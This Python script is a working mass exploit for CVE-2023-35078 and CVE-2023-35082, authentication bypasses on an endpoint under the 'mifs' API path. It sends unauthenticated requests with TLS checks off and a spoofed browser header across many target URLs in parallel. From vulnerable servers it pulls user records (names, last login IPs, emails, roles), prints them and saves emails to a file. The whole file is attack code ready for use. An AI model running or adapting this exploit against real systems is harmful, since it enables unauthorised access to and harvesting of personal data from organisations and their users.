import urllib3
import requests
import argparse
import concurrent.futures

from rich.console import Console
from alive_progress import alive_bar
from urllib.parse import urlparse, urlunparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

def mass_urls(urls, verbose, output_file=None):
    with alive_bar(len(urls), title='Processing URLs') as bar:
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(process_url, url, verbose, output_file): url for url in urls}
            for future in concurrent.futures.as_completed(futures):
                bar()

def process_url(base_url, verbose, output_file=None):
    vulnerabilities = {
        "mifs/asfV3": "CVE-2023-35082",
        "mifs/aad": "CVE-2023-35078"
    }

    cves_found = []  
    valid_data = None 
    valid_url = None
    failed_ports = set()

    parsed_url = urlparse(base_url)
    original_netloc = parsed_url.netloc
    scheme = parsed_url.scheme

    host = original_netloc.split(':')[0] if ':' in original_netloc else original_netloc
    default_port = parsed_url.port if parsed_url.port else ('443' if scheme == 'https' else '80')

    for path, cve in vulnerabilities.items():
        if cve == "CVE-2023-35082":
            ports_and_schemes_to_test = [(default_port, scheme), ('8080', 'http'), ('8080', 'https')]
        else:
            ports_and_schemes_to_test = [(default_port, scheme)]
        
        for port_and_scheme in ports_and_schemes_to_test:
            if port_and_scheme in failed_ports:
                continue

            new_port, new_scheme = port_and_scheme
            new_netloc = f"{host}:{new_port}"

            modified_base_url = urlunparse(parsed_url._replace(netloc=new_netloc, scheme=new_scheme))

            data = fetch_data(modified_base_url, path, verbose)
            if data is None:
                failed_ports.add(port_and_scheme)
            else:
                valid_data = data 
                valid_url = modified_base_url
                cves_found.append(cve) if not cve in cves_found else None

    if valid_data:
        process_data(valid_url, valid_data, cves_found, verbose, output_file)





def fetch_data(base_url, path, verbose=True):
    url = f"{base_url}/{path}/api/v2/authorized/users?adminDeviceSpaceId=1"

    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Language": "en-US,en;q=0.9,fr;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "DNT": "1",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
    }

    if verbose:
        console.print(f"[blue]Fetching data from:[/blue] {url}")
    
    try:
        response = requests.get(url, headers=headers, verify=False, timeout=5)
        json_data = response.json()
        console.print(f"[bold red]{base_url} may be vulnerable[/bold red]") if verbose else None
        return json_data

    except requests.exceptions.RequestException:
        if verbose:
            console.print(f"[bold red]Connection Error...[/bold red]")
        return None

    except ValueError:
        if verbose:
            console.print("[green]The response is not a valid JSON. The site is not vulnerable.[/green]")
        return None

def process_data(base_url, data, cve, verbose, output_file=None):
    console.print(f"[bold red]{base_url} may be vulnerable to {', '.join(cve)}[/bold red]")
    
    if "results" in data:
        results = data["results"]
    elif "result" in data:
        results = data["result"]
        
    else:
        console.print("[red]Error: Invalid data format. Expected key 'results' or 'result' not found in the data.[/red]")
        return None
    
    emails = []  # To store the first 5 email addresses
    for result in results:
        email = result["email"]
        if email and verbose:
            display_name = result["displayName"]
            last_login_ip = result["lastLoginIp"]
            roles = ', '.join(result["roles"])
            console.print(f"[green]Display Name:[/green] {display_name}")
            console.print(f"[blue]Last Login IP:[/blue] {last_login_ip}")
            console.print(f"[magenta]Email Address:[/magenta] {email}")
            console.print(f"[yellow]Roles:[/yellow] {roles}")
            console.print("-" * 50)
            
        emails.append(email)        

    emails = list(dict.fromkeys(emails))

    if verbose:
        console.print(f"[blue]First 10 Emails:[/blue] {', '.join(emails[:10])}")

    if output_file:
        with open(output_file, "a") as file:
            file.write(f"{base_url}, [{', '.join(cve)}], {', '.join(emails[:5])}\n")


def main():
    parser = argparse.ArgumentParser(description="Fetch and display user information")
    parser.add_argument('-u', '--url', help="Base URL for the request")
    parser.add_argument('-f', '--file', help="File containing a list of URLs for mass scanning")
    parser.add_argument('-o', '--output', help="Output file to save vulnerable URLs and first 5 emails")
    parser.add_argument('--verbose', action='store_true', help="Verbose mode")
    args = parser.parse_args()

    if args.url:
        process_url(args.url, args.verbose, args.output)
    elif args.file:
        with open(args.file, "r") as file:
            urls = [line.strip() for line in file]
            mass_urls(urls, args.verbose, args.output)

if __name__ == "__main__":
    main()
